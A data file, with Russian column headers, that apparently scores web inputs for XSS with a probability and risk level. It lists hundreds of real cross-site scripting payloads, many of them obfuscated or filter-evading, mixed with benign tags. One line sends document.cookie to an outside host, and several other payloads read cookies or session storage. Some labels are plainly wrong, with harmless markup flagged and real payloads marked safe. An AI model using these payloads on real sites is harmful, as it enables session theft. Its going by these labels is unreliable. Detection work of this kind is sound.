Входная строка;XSS;Вероятность;Риск
<span class='class-14'>Services</span>;False;1.21%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>";True;65.48%;HIGH
%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E;True;84.02%;CRITICAL
<span class='class-324'>Services</span>;False;1.13%;SAFE
<span class='class-34'>Services</span>;False;1.21%;SAFE
<span class='class-1474'>Services</span>;False;1.13%;SAFE
<div>Home</div>;False;25.75%;LOW
<h2>Login</h2>;False;27.98%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<p>About</p>;False;34.33%;LOW
<p>About</p>;False;34.33%;LOW
<span class='class-224'>Services</span>;False;1.13%;SAFE
<audio src/onerror=alert(1)>;True;99.78%;CRITICAL
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>";True;98.61%;CRITICAL
%22-alert('XSS')-%22;True;89.32%;CRITICAL
<p>About</p>;False;34.33%;LOW
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<iframe src=""javasc%0a%0dript:alert(0);"">";True;90.66%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<h2>Login</h2>;False;27.98%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"""><svg+onload=alert&amp;#x17""1";True;99.49%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
<p>About</p>;False;34.33%;LOW
"%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%0d%0a%0d%0a%3Cscript%3Ealert(1);%3C/script%3E";True;75.46%;HIGH
javascript:alert(1)?q=%26callback%3Durc_button.click%23;True;93.11%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
%2sscript%2ualert()%2s/script%2u;True;92.19%;CRITICAL
<svg on onload=(alert)(document.domain)> -@zapstiko;True;98.85%;CRITICAL
<div>Home</div>;False;25.75%;LOW
javascript:\\\\\\\/\\\\\\\/%250Aalert(1);True;94.38%;CRITICAL
"&lt;&lt;img src=x onerror=prompt(document)&gt;&gt;;";True;87.46%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<button>Read more</button>;False;28.28%;LOW
<button>Read more</button>;False;28.28%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<input type='text' name='field'>;False;29.42%;LOW
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a>";True;90.02%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<input type='text' name='field'>;False;29.42%;LOW
"""><img src=x onerror=prompt(document['domain']);>.php";True;80.54%;CRITICAL
"'"">><marquee><img src=x onerror=confirm(1)></marquee>""></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->""></script><script>alert(1)</script>""><img/id=""confirm&lpar;1)""/alt=""/""src=""/""onerror=eval(id&%23x29;>'""><img src=""http://i.imgur.com/P8mL8.jpg"">";True;37.75%;LOW
"'\u003E'\u0022><script>alert(2);</script>";True;92.31%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
"""><img src=x onerror=this.innerHTML=''><script>alert(document.domain)</script>"">";True;97.59%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
<h6>Login</h6>;False;27.98%;LOW
"ryp3i""accesskey=""x""onclick=""alert(1)""//opk15";True;99.41%;CRITICAL
"&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;";True;76.12%;HIGH
?query=<img/src/onerror=alert(`test`)>;True;99.44%;CRITICAL
</h1><script>alert(1)</script><h1>;True;90.68%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<h4>Login</h4>;False;27.98%;LOW
<p>About</p>;False;34.33%;LOW
"<a href=""&#0000106avascript:alert(1)"">XSS</a>";False;3.93%;SAFE
<isindex action=javascript:alert(1) type=submit value=click>;True;86.88%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"""<!--><Svg OnLoad=confirm?.(/d3rkðŸ˜ˆ/)<!--1"")""<!--><Svg+OnLoad=confirm?.(/d3rkðŸ˜ˆ/)<!--";True;97.75%;CRITICAL
10</option></select><img/src=xon=()onx+honerror=alert(1)>ss<svg/onload=prompt(document.domain)%20>;True;99.14%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<h4>Login</h4>;False;27.98%;LOW
<h4>Login</h4>;False;27.98%;LOW
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">";True;99.14%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<sCript>confirm()</sCript>;True;39.17%;LOW
"""><svg+onload=alert&amp;#x1C""1";True;99.49%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>";False;18.64%;SAFE
"1'""><A HRef=\"" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>";True;97.84%;CRITICAL
<span class='class-384'>Services</span>;False;1.13%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
%u0022%u003e%u003cscript%u003ealert%u0028%u0027Hello%u0027%u0029%u003c%u002fscript%u003e;True;81.80%;CRITICAL
"1'""();<test><iframe onload=""window.alert('XSS_WAF_BYPASS')""></iframe>";True;99.43%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
<p>About</p>;False;34.33%;LOW
<h4>Login</h4>;False;27.98%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<img/src/onerror=""window[`al+/e/[`ex + `ec`]`e`+`rt`](2)"">";True;98.67%;CRITICAL
"""><svg onload=alert(1)>";True;99.62%;CRITICAL
"123456%22/%3E%3Cmath%3E%3Carchy%20href=Ja%26Tab;vascript%26colon;console.error(1)%3EARCHY%3C/archy%3E%3C/math%3E%3C!--";True;83.55%;CRITICAL
<form><input formaction=javascript:alert(1) type=image value=click>;True;91.73%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<div>Home</div>;False;25.75%;LOW
"""<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >""";True;40.23%;MEDIUM
"""><svg+onload=alert&amp;#x75""1";True;99.49%;CRITICAL
"<svg/onloadâ€‹=alert//&NewLine;(2)>";True;58.33%;MEDIUM
<span class='class-1404'>Services</span>;False;1.13%;SAFE
\u003cimg src onerror=alert(1)\u003e;True;99.69%;CRITICAL
<svg/onload=alert('XSS')>;True;98.98%;CRITICAL
"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>";True;53.94%;MEDIUM
<img/src='1'/onerror=alert(0)>;True;99.32%;CRITICAL
<img ignored=() src=x onerror=prompt(1)>;True;85.36%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"""><svg+onload=alert&amp;#x5B""1";True;99.49%;CRITICAL
<svg/onload=alert(1);True;99.26%;CRITICAL
<input oninput=alert(1) value=xss>;True;99.72%;CRITICAL
//j%5c%5cjavascript%3aalert(document.domain);True;96.13%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
%22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e;True;68.89%;HIGH
"""><img src=x><img src= onerror=prompt(document.domain);>";True;87.45%;CRITICAL
"""><svg+onload=alert&amp;#x21""1";True;99.49%;CRITICAL
<span class='class-694'>Services</span>;False;1.13%;SAFE
<IMG+SRC=j&#X41vascript:alert(1)>;True;84.27%;CRITICAL
"<svg/onloadâ€‹=alert&#x2F;**&#47;(5)>";True;70.41%;HIGH
\u0061\u006c\u0065\u0072\u0074(1);True;70.28%;HIGH
<span class='class-1104'>Services</span>;False;1.13%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<script>alert(1234)</script>;True;86.52%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""><svg+onload=alert&amp;#x6C""1";True;99.49%;CRITICAL
q=javascript:alert(document.domain);True;96.91%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><svg+onload=alert&amp;#x8A""1";True;99.49%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
<!--><svg onload=alert(1)-->.aspx;True;99.63%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""/>""/><img src=xss onerror=alert(2)>";True;99.31%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<script>{onerror=alert}throw 1</script>;True;99.41%;CRITICAL
JavaScript://%250Dtop.confirm?.(1)//;True;78.66%;HIGH
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<IMG+DYNSRC=""javascript:alert(1);"">";True;89.65%;CRITICAL
<--%253cimg%20onerror=alert(1)%20src=a%253e --!>;True;99.01%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"""><svg onload=""confirm(7)"">";True;82.94%;CRITICAL
<span class='class-984'>Services</span>;False;1.13%;SAFE
"&quot;&gt;&lt;SVG ONLOAD=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(&amp;#x64&amp;#x6f&amp;#x63&amp;#x75&amp;#x6d&amp;#x65&amp;#x6e&amp;#x74&amp;#x2e&amp;#x64&amp;#x6f&amp;#x6d&amp;#x61&amp;#x69&amp;#x6e)&gt;";True;70.12%;HIGH
<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>;True;99.57%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<svg%0Ao%00nload=%09((pro\u006dpt))()//;True;84.23%;CRITICAL
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe;False;3.06%;SAFE
<h4>Login</h4>;False;27.98%;LOW
"`javascript://'/</title></style></textarea></script>--><p"" %0D %0A onclick=alert(123)//>/alert()/";True;99.10%;CRITICAL
<body onorientationchange=alert(1)>;True;99.58%;CRITICAL
"%'});%0aalert(1);%20//";True;90.81%;CRITICAL
--><script>alert(123)</script>;True;86.52%;CRITICAL
""">>>>>><marquee>RXSS</marquee></head><abc%3E</script><script>alert(document.cookie)</script><meta";True;74.01%;HIGH
"<isindex x=""javascript:"" onmouseover=""alert(XSS)"">";True;99.38%;CRITICAL
"&quot;&gt;&lt;img src=x onerror=prompt(&quot;XSS&quot;)&gt;";True;78.71%;HIGH
"""><iframe onload=alert(1);>";True;99.16%;CRITICAL
"<a href=""jav%0Dascript&colon;alert(1)"">";False;5.36%;SAFE
<address id=x tabindex=1 onfocus=alert(1)></address>;True;99.86%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"â€&gt;&lt;svg onload=alert&amp;#0000000040""1"")&gt;";True;99.39%;CRITICAL
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>";True;94.51%;CRITICAL
<p>About</p>;False;34.33%;LOW
<!--><svg onload=alert(1)-->.html;True;99.63%;CRITICAL
<svg onload=eval(document.cookie)>;True;92.33%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"""><svg%20onload=alert%26%230000000040""1"")> (working)- @IamRenganathan";True;98.62%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<x onxxx=alert(1) 1=';True;99.37%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"<script>eval(â€˜a\u006cert(1)â€™);</script>";True;91.36%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<h2>Login</h2>;False;27.98%;LOW
<scr<script>ipt>alert(1)</script>;True;90.58%;CRITICAL
"<img src=""java    script:al ert('Successful XSS')"">";True;91.29%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<span class='class-754'>Services</span>;False;1.13%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"""><body/onload=""{x:onerror=alert};x""";True;99.37%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<form><input formaction=javascript:alert(1) type=submit value=click>;True;83.89%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<meta style=""xss:expression(open(alert(1)))"" />";False;1.52%;SAFE
<button>Read more</button>;False;28.28%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
'x'%20onclick='confirm`1`';True;75.46%;HIGH
"""><svg+onload=alert&amp;#x35""1";True;99.49%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<button>Read more</button>;False;28.28%;LOW
%26%23x2f%3B%26%23x2f%3Br4y.pw;True;60.05%;HIGH
<video onfocus=alert(1) autofocus tabindex=1>;True;99.68%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//;True;73.50%;HIGH
"javascript://'/</title></style></textarea></script>--><p"" %0D %0A onclick=alert(123)//>*/alert()/*<img src=x onerror=alert(456)/><svg/onload=prompt(789)/>;'""// :;fn();%0a%0d\n\r\t{{12*12+'Audi RS5'.substr(0,4)}}XXX<script>alert('XSS')<img src=x onerror='(function s(){var i=new Image();i.src='http://bl4de.tech/bxss.php?c='+document.cookie+';'+encodeURIComponent(location.href);document.body.append(i)})()'/>#jaVasCript:/*-/*`/*\\`/*'/*\""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e";True;45.92%;MEDIUM
"'>&lt;/b&gt;%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cb&gt;&lt;!--";True;75.75%;HIGH
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
%22%20autofocus%20onfocus%00%3d(confirm)(1)%2f%2f;True;56.52%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"""><svg+onload=alert&amp;#x92""1";True;99.49%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<h2>Login</h2>;False;27.98%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<span class='class-214'>Services</span>;False;1.13%;SAFE
"""><svg+onload=alert&amp;#x68""1";True;99.49%;CRITICAL
3Cscript%3Ealert(1)%3C%2Fscript%3E##1;True;92.60%;CRITICAL
<span class='class-1294'>Services</span>;False;1.13%;SAFE
<script>alert('XSS')</script>;True;92.14%;CRITICAL
<image2 onfocus=alert(1) autofocus tabindex=1>;True;99.67%;CRITICAL
<span class='class-644'>Services</span>;False;1.13%;SAFE
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>;True;68.47%;HIGH
"""><svg+onload=alert&amp;#x32""1";True;99.49%;CRITICAL
%uff3c%uff73%uff63%uff72%uff69%uff70%uff74%uffe0alert('XSS')%uff3e;True;74.26%;HIGH
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">";True;99.14%;CRITICAL
"javascript://--></script></title></style>""/</textarea>*/<alert()/*' onclick=alert()//>a";True;99.09%;CRITICAL
%0d%0a%20<script>alert(1)</script>;True;83.85%;CRITICAL
"<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>";False;22.82%;LOW
<xss class=progress-bar-animated onanimationstart=alert(1)>;True;99.61%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
//?aspxerrorpath=<script>alert(1)</script>;True;84.40%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"fileName=')},1000);alert(""XSS`);//";True;90.42%;CRITICAL
<svg/onload=self[`aler`%2b`t`]`1`>;True;99.33%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"""><img src=/x onerror=prompt(document.domain);>";True;82.49%;CRITICAL
""";[][â€œ\146\151\154\164\145\162â€][â€œ\143\157\156\163\164\162\165\143\164\157\162â€](â€œ\145\166\141\154\50\141\164\157\142\50\42\131\127\170\154\143\156\121\157\115\123\153\75\42\51\51â€)();var+test=""";True;69.53%;HIGH
"<svg/ONxss='0'/ONload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;";True;62.35%;HIGH
"<INPUT+TYPE=""checkbox""+onDblClick=confirm(XSS)>";True;83.74%;CRITICAL
<scr'+'ipt>alert(1)</scr'+'ipt>;True;92.97%;CRITICAL
<span class='class-784'>Services</span>;False;1.13%;SAFE
"{}."")));alert(1)//"";";True;94.03%;CRITICAL
""" /> <script>alert('XSS Testing"");</script>";False;0.64%;SAFE
"""><svg+onload=alert&amp;#x107""1";True;99.49%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<body onload=""window.alert('XSS_WAF_BYPASS')"">";True;99.35%;CRITICAL
"""><img src=1 onmouseleave=print()> - @itsgeekymonk";True;82.42%;CRITICAL
%u003Cscript%u003Ealert('XSS')%u003C/script%u003E;True;91.60%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"""></select><img%20src=1%20onerror=alert(1)>";True;99.64%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<button onClick=""alert('xss')"">Submit</button>";True;99.84%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
(A(%22onerror='alert%601%60'testabcd))/;True;99.41%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
"STYLE=""xss:expr/*XSS*/ession(alert('XSS')"">";True;87.06%;CRITICAL
"<object/data=""javascript&colon;alert/**/(document.domain)"">//";True;68.68%;HIGH
"'>'+'><script>alert(2);</script>";True;94.68%;CRITICAL
"<script>x=""""-prompt(9)-"""";y=42;</script>";True;65.37%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
a'-alert(1)//;True;87.25%;CRITICAL
"""><img src=x onerror=prompt(document.cookie);>";True;78.78%;HIGH
"""><img src=x onerror=prompt(1);>";True;74.11%;HIGH
"<script>eval('al'+'ert(1)');</script>";True;93.79%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<h4>Login</h4>;False;27.98%;LOW
"<a HREF=""data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg=="">ugh</a>";False;1.13%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<h4>Login</h4>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x37""1";True;99.49%;CRITICAL
"')}, 1000); alert('xss')://";True;94.65%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<div>Home</div>;False;25.75%;LOW
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""+onkeypress=""prompt(23)""+";True;78.13%;HIGH
<span class='class-1184'>Services</span>;False;1.13%;SAFE
/<script>alert(1234)</script>;True;86.52%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<h6>Login</h6>;False;27.98%;LOW
confirm?.(1);True;51.73%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<div>Home</div>;False;25.75%;LOW
"""><div style=""background-image: url(x)"" onerror=prompt(document.domain);>";True;96.40%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<input type='text' name='field'>;False;29.42%;LOW
"""&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;img src=x onerror=prompt(document.domain);&amp;amp;amp;amp;gt;";True;98.27%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<script ~~~>alert(0%0)</script ~~~>;True;53.96%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
"<body background=""javascript:alert('Successful XSS')"">";True;99.17%;CRITICAL
"<xss onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>";True;99.14%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
<svg on onload=(alert)(document.domain)>;True;99.04%;CRITICAL
">""'><script>alert(2);</script>";True;94.70%;CRITICAL
"<!--xss""><img src=x onerror=prompt(document.domain)>-->";True;87.31%;CRITICAL
â€œ><iMg SrC=x onErrorâ€‹=prompt()>;False;29.99%;LOW
<input type='text' name='field'>;False;29.42%;LOW
"""><script akdk> prompt(document.domain)</script akdk>";True;72.11%;HIGH
"<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;"">XXXXX</a>";True;98.68%;CRITICAL
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>;True;99.64%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<script onreadystatechange=alert(1)>;True;98.61%;CRITICAL
<math><brute href=javascript:alert(1)>click;True;92.16%;CRITICAL
<script>alert\u00281\u0029</script>;True;88.39%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<p>About</p>;False;34.33%;LOW
<button>Read more</button>;False;28.28%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<p>About</p>;False;34.33%;LOW
"&lt;svg/onload=&#39;alert&amp;#40 23 &amp;#41;&#39;&gt;";True;99.29%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<x @click=$event.view.alert(1)>click</x>;True;73.26%;HIGH
javascript://'/</title></style></textarea></script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS');True;47.31%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<svg onload=prompt&#0000000040document.domain)>""";True;91.07%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<button>Read more</button>;False;28.28%;LOW
<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>;True;99.16%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"â‰‹ ""><!'/*""*\'/*\""/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //># â‰‹";True;93.99%;CRITICAL
<p>About</p>;False;34.33%;LOW
<video controls src=1 onfocus=alert(1) autofocus>;True;99.65%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<button>Read more</button>;False;28.28%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
"%3E'><script>alert(2);</script>";True;92.64%;CRITICAL
<span class='class-584'>Services</span>;False;1.13%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
"""ontouchend%3Dprompt%281%29+class%3Dd3rk+";True;53.86%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
"/><svg src=x onload=confirm(document.domain);>";True;86.01%;CRITICAL
"<script>eval(â€˜a\x6cert(1)â€™);</script>";True;81.73%;CRITICAL
<d3v/onmouseleave=[2].some(confirm)>click;True;70.82%;HIGH
"<script>eval(â€˜a\l\ert\(1\)â€™);</script>";True;81.11%;CRITICAL
"å˜¼""><svg onload=prompt(document.domain);>";True;82.33%;CRITICAL
"""><IMG SRC=x ONERROR=prompt(document.domain);>";True;85.48%;CRITICAL
/me/m%3C/script%3E%3Csvg/onload=prompt(document.domain)%3E;True;88.98%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<p>About</p>;False;34.33%;LOW
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>;True;73.57%;HIGH
"""><svg+onload=alert&amp;#x5C""1";True;99.49%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
"&#60;svg/onload=alert(1)&#62;";True;99.51%;CRITICAL
""";alert(123);t=""";True;94.51%;CRITICAL
<span class='class-954'>Services</span>;False;1.13%;SAFE
Dec: <svg onload=prompt%26%230000000040document.domain)>;True;91.83%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
\â€-confirm`1`//;True;52.17%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
"0xd3adc0de&lt;ScRiPt&gt;alert('XSS Success!')&lt;/sCripT&gt;";True;84.35%;CRITICAL
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->;True;99.70%;CRITICAL
"""><svg+onload=alert&amp;#x0A""1";True;99.49%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
onfocus=JaVaSCript:alert(123) autofocus;True;99.23%;CRITICAL
<span class='class-544'>Services</span>;False;1.13%;SAFE
<button>Read more</button>;False;28.28%;LOW
